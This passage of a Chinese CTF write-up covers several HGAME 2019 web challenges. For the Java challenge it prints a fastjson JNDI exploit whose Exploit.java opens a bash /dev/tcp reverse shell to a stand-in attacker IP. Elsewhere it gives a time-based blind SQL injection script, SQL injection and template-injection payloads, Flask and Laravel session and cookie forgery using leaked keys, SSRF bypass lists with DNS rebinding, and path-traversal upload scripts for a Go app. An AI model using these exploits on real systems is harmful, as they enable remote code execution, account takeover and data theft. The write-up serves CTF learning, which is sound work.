$_SESSION['token']) { if ($_SESSION['groups'] == 0) { $sql_query = \"delete from `messages` where `message_id`=$message_id and `user_id`=$user_id\"; } elseif ($_SESSION['groups'] == 1) { $sql_query = \"delete from `messages` where `message_id`=$message_id\"; } sql_query($sql_query); }}function rand_filename(){ $tmp = `cat /dev/urandom | head -n 10 | md5sum | head -c 15`; $sql_query = \"select `avatar` from `users` where `avatar`=$tmp\"; $res = sql_query($sql_query); if ($res-&gt;num_rows) { return rand_filename(); } else { return $tmp; }}function upload_avatar(){ $type = $_FILES['file']['type']; $user_id = $_SESSION['user_id']; if ($type == 'image/gif' || $type == 'image/jpeg' || $type == 'image/png') { $avatar = get_avatar($user_id); if ($avatar == null) { $name = rand_filename(); move_uploaded_file($_FILES['file']['tmp_name'], \"./img/avatar/\" . $name . \".png\"); $sql_query = \"update `users` set `avatar`='$name' WHERE `user_id`=$user_id\"; sql_query($sql_query); } else { move_uploaded_file($_FILES['file']['tmp_name'], \"./img/avatar/\" . $avatar['name'] . \".png\"); } }}function change_password($opassword, $npassword, $npasswod_again){ if (judge($_SESSION['user'], $npassword)) { if ($npasswod_again !== $npassword) { echo \"difference error\"; } else { $user_id = $_SESSION['user_id']; $sql_query = \"select `password` from `users` where `user_id`=$user_id\"; $res = sql_query($sql_query); if ($res-&gt;num_rows) { if ($res-&gt;fetch_row()[0] === md5($opassword)) { $sql_query = \"update `users` set `password`=md5($npassword) WHERE `user_id`=$user_id\"; $res = sql_query($sql_query); echo $res; echo \"successful\"; } else { echo \"oldpassword error\"; } } } }} Message.php 12345678910111213141516171819202122&lt;h1 class=\"title\" id=\"title\"&gt;Message Board&lt;/h1&gt;&lt;div id=\"container\" class=\"am-container\"&gt;&lt;/div&gt;&lt;div id=\"rocket\" class=\"am-icon-btn\" onclick=\"ReturnTop()\"&gt;&lt;/div&gt;&lt;div id=\"write_message\" class=\"am-icon-btn\"&gt;&lt;/div&gt;&lt;div class=\"am-modal am-modal-prompt\" tabindex=\"-1\" id=\"my-prompt\"&gt; &lt;div class=\"am-modal-dialog am-form\" id=\"message_area\"&gt; &lt;div class=\"am-modal-hd\"&gt;写留言&lt;/div&gt; &lt;div class=\"am-modal-bd\"&gt; &lt;textarea class='textarea' name=\"new_message\" id=\"new_message\" cols=\"30\" rows=\"10\"&gt;&lt;/textarea&gt;&lt;br&gt; &lt;/div&gt; &lt;div class=\"am-modal-footer\"&gt; &lt;button class=\"am-btn am-btn-danger button \" id=\"button_cancel\" data-am-modal-cancel&gt;取 消 &lt;/button&gt; &lt;button class=\"am-btn am-btn-primary button \" id=\"button_sumbit\" data-am-modal-confirm&gt; 提 交 留 言 &lt;/button&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt;&lt;script src='/js/index.js'&gt;&lt;/script&gt; Config.php 1234567&lt;?php$DBHOST = \"127.0.0.1\";$DBUSER = getenv('DATABASE_USER');$DBPASS = getenv('DATABASE_PASS');$DBNAME = \"lyb\";$mysqli = new mysqli($DBHOST, $DBUSER, $DBPASS, $DBNAME);?&gt; Login.php 123456789101112131415&lt;?phprequire_once('functions.php');if (!isset($_POST['username']) or !isset($_POST['password'])) { if (isset($_GET['loginout'])) { loginout(); } if (!isset($_SESSION['login'])) { include('template/login.html'); csrf_token(); } else { Header('Location: /index.php'); }} else { login(addslashes($_POST['username']), addslashes($_POST['password']), $_POST['token']);} index.php 12345678910&lt;?phpinclude_once(\"template/header.php\");if (is_null($_SESSION['user_id'])) { header('Location:/login.php'); exit();}$page = array_key_exists('action', $_GET) ? $_GET['action'] : 'message';require $page .'.php';include_once(\"template/footer.php\");?&gt; Message_api.php 12345678910111213141516171819202122232425262728&lt;?phprequire_once('functions.php');if ($_GET['action'] === 'add') { if (!isset($_POST['new_message']) or !isset($_POST['token'])) { header(\"Location: /index.php\"); } else { add_message(htmlspecialchars(addslashes($_POST['new_message']))); }} elseif ($_GET['action'] === 'delete') { if (!isset($_POST['message_id']) or !isset($_POST['token'])) { header(\"Location: /index.php\"); } else { delete_message(addslashes($_POST['message_id'])); }} elseif ($_GET['action'] === 'get_new') { if (is_null($_SESSION['user_id'])) { http_response_code(403); } else { echo get_new_messages(); }} elseif($_GET['action'] === 'get') { if (is_null($_SESSION['user_id'])) { http_response_code(403); } else { echo get_messages(); }} 在functions.php中我们可以看到一个明显的注入 12345678910111213function delete_message($message_id){ $user_id = $_SESSION['user_id']; if ($_POST['token'] === $_SESSION['token']) { if ($_SESSION['groups'] == 0) { $sql_query = \"delete from `messages` where `message_id`=$message_id and `user_id`=$user_id\"; } elseif ($_SESSION['groups'] == 1) { $sql_query = \"delete from `messages` where `message_id`=$message_id\"; } sql_query($sql_query); }} 我们就可以从$message_id进行注入。然而这个注入可以搭配什么进行攻击呢，既然首页有文件包含，我们是不是可以利用上传头像来进行包含利用，这个sql注入就可以帮助我们获得头像文件名了。 大致思路就出来了，通过头像上传，然后使用注入获得路径，在用phar://xxxx/xxxx来访问拿到shell 这里不知道为什么访问有点问题，贴一下一叶飘零师傅的 jio 本好了： 123456789101112131415161718192021222324252627282930313233343536373839404142import requestsimport reflag=''res = \"&lt;input type='hidden' value='(.*?)' id='token'\"url = 'http://111.231.140.29:10080/index.php'header={ 'User-Agent':'curl/7.54.0', 'Accept':'*/*'}cookie = { 'PHPSESSID':'mobe47sd6q6ocl6g9upcok0ad8', 'user':'zeddy', 'groups':'0'}url2 = 'http://111.231.140.29:10080/messages_api.php?action=delete'url4 = 'http://111.231.140.29:10080/messages_api.php?action=add'for i in range(1,1000): print(i) # for j in range(33,127): for j in '0123456789abcdef': j = ord(j) r = requests.get(url=url, cookies=cookie,headers=header) token = re.findall(res, r.content.decode('utf-8'))[0] #payload = \"-1 or if((ascii(substr((database()),%d,1))=%d),sleep(5),0)#\"%(i,j) payload = \"-1 or if((ascii(substr((select avatar from users where username like 0x7a65646479),%d,1))=%d),sleep(3),0)#\"%(i,j) data = { 'message_id':payload, 'token':token } try: r = requests.post(data=data,cookies=cookie,url=url2,timeout=2.5,headers=header) except: flag += chr(j) print(flag) r = requests.get(url=url, cookies=cookie,headers=header) token = re.findall(res, r.content.decode('utf-8'))[0] data = { 'new_message': '123456', 'token': token } r = requests.post(data=data,cookies=cookie,url=url4,headers=header) break BabyXSS save 按钮尝试 xss(尝试过程不需要输验证码)，成功后带上验证码 code，submit 按钮提交 xss 语句；flag 在 admin 的 cookie 里面,格式 hgame{xxxxx}。 http://118.25.18.223:9000/index.php 一直访问不了 233 参考其他师傅的 wp ，只是一个简单的双写关键字绕过 Week 4WebhappyPython flag 在管理员账号下 http://118.25.18.223:3001 思路主要是伪造 admin cookiel 了，所以我们需要读secret_key 使用 /{{[].__class__.__base__.__subclasses__()}} 与 /{{[].__class__.__base__.__subclasses__}} 两个返回均相同 发现是()被过滤了 一直想着去用文件读取secret_key，但是又因为()被过滤，怎么也做不出来 后来发现用/可以得到…….orz，也可以用url_for.__globals__['current_app'].config读取 1&lt;Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': '9RxdzNwq7!nOoK3*', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(0, 43200), 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093, 'CSRF_ENABLED': True, 'SQLALCHEMY_DATABASE_URI': 'mysql+pymysql://hgame:asdkjhiou12312451r2@127.0.0.1:3306/hgame', 'SQLALCHEMY_TRACK_MODIFICATIONS': True, 'WTF_CSRF_ENABLED': True, 'WTF_CSRF_CHECK_DEFAULT': True, 'WTF_CSRF_METHODS': {'PUT', 'DELETE', 'POST', 'PATCH'}, 'WTF_CSRF_FIELD_NAME': 'csrf_token', 'WTF_CSRF_HEADERS': ['X-CSRFToken', 'X-CSRF-Token'], 'WTF_CSRF_TIME_LIMIT': 3600, 'WTF_CSRF_SSL_STRICT': True, 'SQLALCHEMY_BINDS': None, 'SQLALCHEMY_NATIVE_UNICODE': None, 'SQLALCHEMY_ECHO': False, 'SQLALCHEMY_RECORD_QUERIES': None, 'SQLALCHEMY_POOL_SIZE': None, 'SQLALCHEMY_POOL_TIMEOUT': None, 'SQLALCHEMY_POOL_RECYCLE': None, 'SQLALCHEMY_MAX_OVERFLOW': None, 'SQLALCHEMY_COMMIT_ON_TEARDOWN': False}&gt; 得到'SECRET_KEY': '9RxdzNwq7!nOoK3*'，登录自己注册的账号，解码自己的.session 12345session=.eJwljztqQzEQAO-i2sXuSlpJvsxjv8QYEnjPrkLubkGa6QZmfsuRZ1xf5f4633Erx8PLvSTRjFoNNakTA_QchoC0fMlmGgtR8kRhI_TRhNb0QJIkWGukkjB5MC9ts4VONOBuFZJy9LU0vfbhlt1osok2ZIXk8A0pt2LXmcfr5xnfuwfFlIMcQEbSVPW05r1ip6W1br9RA-3be19x_k8QcPn7ABDuP70.XHK0ew.2CT1_Vu5Qp8rMbm8ig80dve2-Zgpython2 session_cookie_manager.py decode -c '.eJwljztqQzEQAO-i2sXuSlpJvsxjv8QYEnjPrkLubkGa6QZmfsuRZ1xf5f4633Erx8PLvSTRjFoNNakTA_QchoC0fMlmGgtR8kRhI_TRhNb0QJIkWGukkjB5MC9ts4VONOBuFZJy9LU0vfbhlt1osok2ZIXk8A0pt2LXmcfr5xnfuwfFlIMcQEbSVPW05r1ip6W1br9RA-3be19x_k8QcPn7ABDuP70.XHK0ew.2CT1_Vu5Qp8rMbm8ig80dve2-Zg'{u'csrf_token': u'1acb6e2d00a7f28bbdfc4d531529b336ca4240b5', u'_fresh': True, u'user_id': u'206', u'_id': u'f228e33c1bf2526005f7c10129d9a129fc6a22f681a6c21d74a298de12af20997fb2a62de669b484eb81c065c30f2f7599bfd357dcf5c286cab416b0f6ed0f6a'} 这里千万不要改其他的东西，就改u'user_id'字段就可以了，改成 1 后用encode就行了，这里有师傅说要用 python3 ，因为 timestamp 的原因，可是这里我并没有用 python3 ，直接用 python2 就过了 123python2 session_cookie_manager.py encode -s '9RxdzNwq7!nOoK3*' -t \"{u'csrf_token': u'1acb6e2d00a7f28bbdfc4d531529b336ca4240b5', u'_fresh': True, u'user_id': u'1', u'_id': u'f228e33c1bf2526005f7c10129d9a129fc6a22f681a6c21d74a298de12af20997fb2a62de669b484eb81c065c30f2f7599bfd357dcf5c286cab416b0f6ed0f6a'}\"{u'csrf_token': u'1acb6e2d00a7f28bbdfc4d531529b336ca4240b5', u'_fresh': True, u'user_id': u'1', u'_id': u'f228e33c1bf2526005f7c10129d9a129fc6a22f681a6c21d74a298de12af20997fb2a62de669b484eb81c065c30f2f7599bfd357dcf5c286cab416b0f6ed0f6a'} happyPHP flag 在管理员账号下 http://118.25.18.223:3000/ 在看 git 的时候，切记要看一下历史记录，可能会有新收获 源码发现给了 github 仓库https://github.com/Lou00/laravel，是一套用 laravel 写的 慢慢审计，在laravel/app/Http/Controllers/SessionsController.php中发现一下代码 1234567891011121314151617181920public function store(Request $request) { $credentials = $this-&gt;validate($request, [ 'email' =&gt; 'required|email|max:100', 'password' =&gt; 'required' ]); if (Auth::attempt($credentials)) { if (Auth::user()-&gt;id ===1){ session()-&gt;flash('info','flag :******'); return redirect()-&gt;route('users.show'); } $name = DB::select(\"SELECT name FROM `users` WHERE `name`='\".Auth::user()-&gt;name.\"'\"); session()-&gt;flash('info', 'hello '.$name[0]-&gt;name); return redirect()-&gt;route('users.show'); } else { session()-&gt;flash('danger', 'sorry,login failed'); return redirect()-&gt;back()-&gt;withInput(); } } 而整个路由有 1234567Route::get('/', 'StaticPagesController@home')-&gt;name('home');Route::get('/register','UsersController@register')-&gt;name('register');Route::get('/login','UsersController@login')-&gt;name('login');Route::get('/users', 'UsersController@show')-&gt;name('users.show');Route::post('/users', 'UsersController@store')-&gt;name('users.store');Route::post('/login', 'SessionsController@store')-&gt;name('login');Route::get('/logout', 'SessionsController@destroy')-&gt;name('logout'); 所以我们还是需要登录管理员账号去获取 flag，而且这里的注入点是name，邮箱唯一，所以我们可以注册一个name=admin' or 1=1;#的账户测试注入 所以用 12345678admin' union select password FROM `users` WHERE `id`= '1' ORDER BY name DESC;#得到 admin 的密码admin' union select email FROM `users` WHERE `id`= '1' ORDER BY name DESC;#得到 admin 的邮箱admin@hgame.coma' union select load_file('/etc/passwd') ORDER BY name DESC;#读取失败 得到 1234eyJpdiI6InJuVnJxZkN2ZkpnbnZTVGk5ejdLTHc9PSIsInZhbHVlIjoiRWFSXC80ZmxkT0dQMUdcL2FESzhlOHUxQWxkbXhsK3lCM3Mra0JBYW9Qb2RzPSIsIm1hYyI6IjU2ZTJiMzNlY2QyODI4ZmU2ZjQxN2M3ZTk4ZTlhNTg4YzA5N2YwODM0OTllMGNjNzIzN2JjMjc3NDFlODI5YWYifQ==base64_decode 得到{\"iv\":\"rnVrqfCvfJgnvSTi9z7KLw==\",\"value\":\"EaR\\/4fldOGP1G\\/aDK8e8u1Aldmxl+yB3s+kBAaoPods=\",\"mac\":\"56e2b33ecd2828fe6f417c7e98e9a588c097f083499e0cc7237bc27741e829af\"} 尝试参考Laravel cookie 伪造,解密,和远程命令执行，对id=1的管理员进行 cookie 伪造，但是无解。 找到一个 php 解密脚本，但是没有$key，就没办法解密。在而$key存在于.env中，我们在github commit中找到了被删除的.env，.env中找到APP_KEY=base64:9JiyApvLIBndWT69FUBJ8EQz6xXl5vBs7ofRDm9rogQ= 搜了一下解密脚本，laravel cookie 加解密 123456789101112131415161718192021222324252627&lt;?phpfunction decode($str,$key){ $payload = json_decode(base64_decode($str), true); $iv = base64_decode($payload['iv']); $decrypted = openssl_decrypt($payload['value'], 'AES-256-CBC', $key, 0, $iv); return unserialize($decrypted);}function encode($value,$key){ $iv = random_bytes(openssl_cipher_iv_length('AES-256-CBC')); $value = openssl_encrypt(serialize($value),'AES-256-CBC', $key, 0, $iv); $iv = base64_encode($iv); $mac = hash_hmac('sha256',$iv.$value,$key); $json = json_encode(compact('iv', 'value', 'mac')); return base64_encode($json);}/** * .env 里面的 APP_KEY */$key = base64_decode('9JiyApvLIBndWT69FUBJ8EQz6xXl5vBs7ofRDm9rogQ=');$value = '596|6EvT3jxKRaTwcuj5NEgdnztIjjKDX4lfqz38DGDR4hET8XaEXS35vZTksROl|';// $str = encode($value,$key).PHP_EOL;$str = 'eyJpdiI6InJuVnJxZkN2ZkpnbnZTVGk5ejdLTHc9PSIsInZhbHVlIjoiRWFSXC80ZmxkT0dQMUdcL2FESzhlOHUxQWxkbXhsK3lCM3Mra0JBYW9Qb2RzPSIsIm1hYyI6IjU2ZTJiMzNlY2QyODI4ZmU2ZjQxN2M3ZTk4ZTlhNTg4YzA5N2YwODM0OTllMGNjNzIzN2JjMjc3NDFlODI5YWYifQ==';echo decode($str,$key); 把相关参数填上，得到密码 9pqfPIer0Ir9UUfR，登录admin@hgame.com得到 flag 这里一开始以为自己破解密码的思路不太对，而且自己之前也没有关注到 commit 找到$key。还是主要是找脚本不太好找，我尝试了很多个脚本都没有成功解密。后来经过师傅提点才知道确实可以密码破解，就去各种找密码了才搞定。 happyJava java is not so hard, is it right?hint: spring-boot-actuator http://119.28.26.122:23333/index 题目设置很简单，目录什么的不存在的，直接访问/hgame_flag直接返回与其他页面一样的 404 不存在的错误 看了一下Springboot 之 actuator 配置不当的漏洞利用，以及spring boot 2 使用 actuator 404 的问题遍历了敏感路径都是 404 ……1.x 和 2.x 路径都试过了…没啥想法 以下是复现 wp……orz: actuator 部署时，可以选择与当前项目不同端口 于是扫一波端口可以看到9876跟31337 1234567891011121314151617181920Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-24 23:36 CSTNmap scan report for 119.28.26.122Host is up (0.045s latency).Not shown: 987 closed portsPORT STATE SERVICE22/tcp open ssh135/tcp filtered msrpc139/tcp filtered netbios-ssn445/tcp filtered microsoft-ds593/tcp filtered http-rpc-epmap901/tcp filtered samba-swat1025/tcp filtered NFS-or-IIS3128/tcp filtered squid-http4444/tcp filtered krb5246129/tcp filtered unknown6667/tcp filtered irc9876/tcp open sd31337/tcp open EliteNmap done: 1 IP address (1 host up) scanned in 2.31 seconds 31337应该不是http服务，于是在9876扫了一波目录，终于发现了泄露的关键信息，http://119.28.26.122:9876/info返回了空的json，http://119.28.26.122:9876/mappings返回了如下信息 1{\"/webjars/**\":{\"bean\":\"resourceHandlerMapping\"},\"/**\":{\"bean\":\"resourceHandlerMapping\"},\"/**/favicon.ico\":{\"bean\":\"faviconHandlerMapping\"},\"{[/index],methods=[GET]}\":{\"bean\":\"requestMappingHandlerMapping\",\"method\":\"public java.lang.String me.lightless.happyjava.controller.MainController.Index()\"},\"{[/you_will_never_find_this_interface],methods=[GET]}\":{\"bean\":\"requestMappingHandlerMapping\",\"method\":\"public java.lang.String me.lightless.happyjava.controller.MainController.YouWillNeverFindThisInterface(java.lang.String)\"},\"{[/secret_flag_here],methods=[GET]}\":{\"bean\":\"requestMappingHandlerMapping\",\"method\":\"public java.lang.String me.lightless.happyjava.controller.MainController.SecretFlagHere(java.lang.String,javax.servlet.http.HttpServletRequest)\"},\"{[/error],methods=[GET]}\":{\"bean\":\"requestMappingHandlerMapping\",\"method\":\"public java.lang.String me.lightless.happyjava.controller.ErrorController.ShowCommonError()\"},\"{[/error],produces=[text/html]}\":{\"bean\":\"requestMappingHandlerMapping\",\"method\":\"public org.springframework.web.servlet.ModelAndView org.springframework.boot.autoconfigure.web.BasicErrorController.errorHtml(javax.servlet.http.HttpServletRequest,javax.servlet.http.HttpServletResponse)\"},\"{[/error]}\":{\"bean\":\"requestMappingHandlerMapping\",\"method\":\"public org.springframework.http.ResponseEntity&lt;java.util.Map&lt;java.lang.String, java.lang.Object&gt;&gt; org.springframework.boot.autoconfigure.web.BasicErrorController.error(javax.servlet.http.HttpServletRequest)\"}} 访问/secret_flag_here，发现返回 12345678HTTP/1.1 200 X-Application-Context: application:23333Content-Type: text/html;charset=UTF-8Content-Length: 87Date: Sun, 24 Feb 2019 15:57:48 GMTConnection: closeThis is danger interface, only allow request from 127.0.0.1!&lt;br/&gt;Your IP:xxx.xxx.xxx.xxx(已打码) 用以下一梭子 HTTP 头伪造都没有用… 123456789Client-Ip: 127.0.0.1X-Client-IP: 127.0.0.1X-Real-IP: 127.0.0.1True-Client-IP: 127.0.0.1X-Originating-IP: 127.0.0.1X-Forwarded-For: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1X-Forwarded-Host: 127.0.0.1 应该是要形成 ssrf 或者其他的了吧，尝试继续访问/you_will_never_find_this_interface，得到 12345678HTTP/1.1 200 X-Application-Context: application:23333Content-Type: text/html;charset=UTF-8Content-Length: 20Date: Sun, 24 Feb 2019 16:00:53 GMTConnection: close`url` cant be empty! 尝试访问/you_will_never_find_this_interface?url=1，返回 1emmmmmmm, something went wrong: no protocol: 1 尝试url=http://localhost/you_will_never_find_this_interface，返回 1Dont be evil. Dont request 127.0.0.1. http%3a//[%3a%3a]%3a23333/you_will_never_find_this_interface返回 400 12345678910111213141516171819http://example.com@127.0.0.1:23333/you_will_never_find_this_interfacehttp://127.0.0.1.xip.io:23333/you_will_never_find_this_interfaceDont be evil. Dont request 127.0.0.1.http://127。0。0。1/secret_flag_hereemmmmmmm, something went wrong: Label has two-byte char: 127。0。0。1http://0x7f000001:23333/secret_flag_hereemmmmmmm, something went wrong: DNS name not found [response code 3]http://0177.0.0.1:23333/secret_flag_hereemmmmmmm, something went wrong: connect timed outhttp://2130706433:23333/secret_flag_hereDont be evil. Dont request 127.0.0.1.⓵⓶⓻.⓿.⓿.⓵emmmmmmm, something went wrong: Label has two-byte char: ⓵⓶⓻ 尝试了很多绕过方法都没用，最后只剩下用DNS Rebinding来进行绕过了 首先了解一波关于 DNS-rebinding 的总结，可以发现有个比较方便的方法，就是设置两个 A 记录，一个指向 127.0.0.1，另外一个指向不是 127.0.0.1 的地址即可。 这里原文解释的不是很清楚，又请教了一下白师傅，才明白两个记录怎么绕过对 127.0.0.1 的检测的。首先第一次 DNS 解析在 waf 处，检查 DNS 记录是否是 127.0.0.1 ，第二次 DNS 解析在 ajax 或者请求我们传入的 url 地址的时候进行的，因为 DNS 随机解析，所以如果第一次解析，解析到了我们设置的非 127.0.0.1 的地址，就可以绕过 waf 对 127.0.0.1 的检测，否则解析到 127.0.0.1 就直接被 waf ，所以第一次通过的概率为 1/2 ；如果第二次解析，也就是在对 url 进行请求的时候，解析到了 127.0.0.1 的话，这次 ssrf 就算成功了，也就达到了我们访问内网地址的目的，如果解析不是 127.0.0.1 的话，那就失败了，所以第二次成功概率也是 1/2 。综述，整个DNS Rebinding采用两个A记录绕过的成功概率为 1/2 。 可以看到这里已经成功了。 传入data参数，因为作为/secret_flag的参数，这里注意要用urlencode，看到返回WoW! Convert JSON to object...OK!&lt;br&gt;Result: 1 可以使用fastjson反序列化搞定，但是使用vulhub下的fastjson的 exp 直接就报了 waf 参考FastJson 反序列化漏洞利用笔记#基于 JNDI 的 PoC，构造如下的Exploit.java，然后编译成.class文件放在 HTTP 服务端口下提供后续下载 12345678910111213public class Exploit { public Exploit(){ try { java.lang.Runtime.getRuntime().exec( new String[]{\"bash\", \"-c\", \"bash -c \\\"sh &gt;&amp; /dev/tcp/your_ip/port 0&gt;&amp;1\\\"\"}); } catch(Exception e){ e.printStackTrace(); } } public static void main(String[] argv){ Exploit e = new Exploit(); }} 在 vps 上下载marshalsec提供ldap服务，按照步骤mvn clean package -DskipTests编译好后， 1$ java -cp ./target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your_ip:port/#Exploit 在一个端口起一个 HTTP 服务提供受害者下载Exploit.class，在发送以下 payload 1{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://your_ip:1389/Exploit\",\"autoCommit\":true} 记得二次 urlencode ，成功getshell happyGo ​ 别问，问就是 cve 改的​ flag 在/flag 里​ source code:https://pan.baidu.com/s/1wQwqxF6DUr-2AIC_giud0g 提取码: 6v2i http://94.191.10.201:7000/ 复现题 2333……orz 题目提供注册登录功能，登录进来后可以发送消息 也可以修改自己的头像 发现源码有地方 12beego.Router(\"/admin\", &amp;controllers.AdminController{})beego.Router(\"/admin/user/del/:id([0-9]+\", &amp;controllers.UserDelController{}) 看到一个比较奇怪的功能，跟进Controller看看 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475type AdminController struct {truebeego.Controller}func (c *AdminController) Get() {trueuid := c.GetSession(\"uid\")trueif uid == nil {truetruec.Abort(\"500\")true}trueif uid.(int) != 1 {truetruec.Redirect(\"/\", http.StatusFound)truetruereturntrue}trueo := orm.NewOrm()trueu := models.Users{Id:uid.(int)}trueus := []models.Users{}trueerr := o.Read(&amp;u)trueif err != nil {truetruec.Abort(\"500\")true}true_, err = o.QueryTable(\"users\").Filter(\"id__gt\",1).All(&amp;us)trueif err != nil {truetruec.Abort(\"500\")true}truec.Data[\"Users\"] = ustruec.Data[\"Avatar\"] = u.Avatartruec.Data[\"Username\"] = u.Usernametruec.Data[\"UID\"] = u.Idtruec.TplName = \"admin.tpl\"}type UserDelController struct {truebeego.Controller}func (u *UserDelController) Get() {trueuid := u.GetSession(\"uid\")trueif uid == nil {truetrueu.Abort(\"500\")true}trueif uid.(int) != 1 {truetrueu.Redirect(\"/\", http.StatusFound)truetruereturntrue}trueid := u.Ctx.Input.Param(\":id\")truei, _ := strconv.Atoi(id)trueif i == 1 {truetrueu.Redirect(\"/admin\", http.StatusFound)truetruereturntrue}trueo := orm.NewOrm()trueuser := models.Users{Id:i}trueerr := o.Read(&amp;user)trueif err != nil {truetrueu.Abort(\"500\")true}trueif user.Avatar != \"/static/img/avatar.jpg\" {truetrueos.Remove(user.Avatar)true}trueo.QueryTable(\"messages\").Filter(\"uid\", id).Delete()trueo.Delete(&amp;user)trueu.Redirect(\"/admin\", http.StatusFound)} 虽然看起来Go语言有点古怪，但是代码逻辑还是大致懂得，看起来逻辑都比较正常，但是在os.Remove(user.Avatar)，存在一个越权，因为我们可以控制user.Avatar，我们就可以删除任意文件了。 还有一个路由就是/install路由 1beego.Router(\"/install\", &amp;controllers.InstallController{}) 查看InstallController 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849type InstallController struct {truebeego.Controller}func (c *InstallController) Get() {true_, err := os.Stat(\"conf/app.conf\")trueif err != nil &amp;&amp; os.IsNotExist(err) {truetruec.TplName = \"install.tpl\"true} else {truetruec.Redirect(\"/\", http.StatusFound)truetruereturntrue}}func (c *InstallController) Post() {true_, err := os.Stat(\"conf/app.conf\")trueif err != nil &amp;&amp; os.IsNotExist(err) {truetrue//passtrue} else {truetruec.Redirect(\"/\", http.StatusFound)truetruereturntrue}truetype data struct {truetrueHost string `form:\"host\"`truetruePort string `form:\"port\"`truetrueUsername string `form:\"username\"`truetruePassword string `form:\"password\"`truetrueDatabase string `form:\"database\"`true}trued := data{}trueif err := c.ParseForm(&amp;d); err != nil {truetruec.Abort(\"500\")true}trues := `[mysql]username = %spassword = %shost = %sport = %sdatabase = %s`trueerr = ioutil.WriteFile(\"conf/app.conf\", []byte(fmt.Sprintf(s, d.Username, d.Password, d.Host, d.Port, d.Database)),0666)trueif err != nil {truetruec.Abort(\"500\")true}truec.Redirect(\"/\", http.StatusFound)}根据Read MySQL Client’s File，应该是出题人的博客了吧 2333…大致我们可以猜测整个流程，登录管理员，删除app.conf，重新install，用恶意mysql服务器读取任意文件。而登录管理员就需要看到在main.go中的主函数了1234567func main() {truebeego.BConfig.WebConfig.Session.SessionName = \"PHPSESSID\"truebeego.BConfig.WebConfig.Session.SessionProvider=\"file\"truebeego.BConfig.WebConfig.Session.SessionProviderConfig = \"./tmp\"truebeego.BConfig.WebConfig.Session.SessionOn = truetruebeego.Run()}搭环境始终没找到catmsg/routers这个包…蜜汁尴尬，还是放弃了。而且writeup写的极其简单…并没有详细剖析原理。 贴一下其他师傅的脚本，session伪造脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354# coding:utf-8import requestsimport base64ip=\"94.191.10.201\"host=\"http://94.191.10.201:7000\"registerURL = host + \"/auth/register\"loginURL = host + \"/auth/login\"userinfoURL = host + \"/userinfo\"req = requests.session()# registerregisterData={ \"username\":\"ii5am3\", \"password\":\"123456\", \"confirmpass\":\"123456\",}r = req.post(registerURL,data=registerData)print(\"[+] register \"+r.text)# loginloginData={ \"username\":\"ii5am3\", \"password\":\"123456\",}r = req.post(loginURL,data=loginData)print(r\"[+] login \"+r.text)# 获取当前登陆用户的sessionIDsessionID = r.request._cookies._cookies[ip][\"/\"][\"PHPSESSID\"].valueprint(r\"[+] sessionID is \"+ sessionID)# 上传session，伪造cookienewSession = sessionID[0:2]+\"5am3\"filename = \"../../tmp/%s/%s/%s\" %(sessionID[0],sessionID[1],newSession)# 本地搭建环境，登入uid为1的账号，然后获取他的session的文件即可。在这里我给大家attackSession = base64.b64decode(\"Dv+BBAEC/4IAARABEAAAGv+CAAEGc3RyaW5nDAUAA3VpZANpbnQEAgAC\")sessionFiles={\"uploadname\" : (filename, attackSession)}r = req.post(userinfoURL,files=sessionFiles)print(r\"[+] newCookie is: PHPSESSID=\"+ newSession) 伪造服务端脚本： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152# coding:utf-8import requestsimport base64# req表示user1，此时全程用该一个sessionreq = requests.session()ip = \"94.191.10.201\"host = \"http://94.191.10.201:7000\"registerURL = host + \"/auth/register\"loginURL= host + \"/auth/login\"userinfoURL = host + \"/userinfo\"deleteUserURL = host +\"/admin/user/del/2\"installURl = host + \"/install\"attackCookie = base64.b64decode(\"Dv+BBAEC/4IAARABEAAAGv+CAAEGc3RyaW5nDAUAA3VpZANpbnQEAgAC\")# registerregisterData={ \"username\":\"ii5am3\", \"password\":\"123456\", \"confirmpass\":\"123456\",}r= req.post(registerURL,data=registerData)print(\"[+] register \"+r.text)# loginloginData={ \"username\":\"ii5am3\", \"password\":\"123456\",}r = req.post(loginURL,data=loginData)print(r\"[+] login \"+r.text)sessionID= r.request._cookies._cookies[ip][\"/\"][\"PHPSESSID\"].valueprint(r\"[+] sessionID is \"+ sessionID)# 上传session，伪造cookienewSession = sessionID[0:2]+\"5am3\"filename = \"../../tmp/%s/%s/%s\" %(sessionID[0],sessionID[1],newSession)sessionFiles={ \"uploadname\" : (filename, attackCookie)}r = req.post(userinfoURL,files=sessionFiles)print(r\"[+] newSessionID is \"+ newSession)# 修改头像文件链接。sessionFiles={ \"uploadname\" : (\"../../conf/app.conf\", \"12345\")}r = req.post(userinfoURL,files=sessionFiles)# 新建一个请求，伪造admin进行删除用户headers={ \"Cookie\":\"PHPSESSID=\"+newSession}r = requests.get(deleteUserURL,headers=headers)# 重新安装环境，将其指向我们的恶意sql服务器。installData = { \"host\":\"your_ip\", 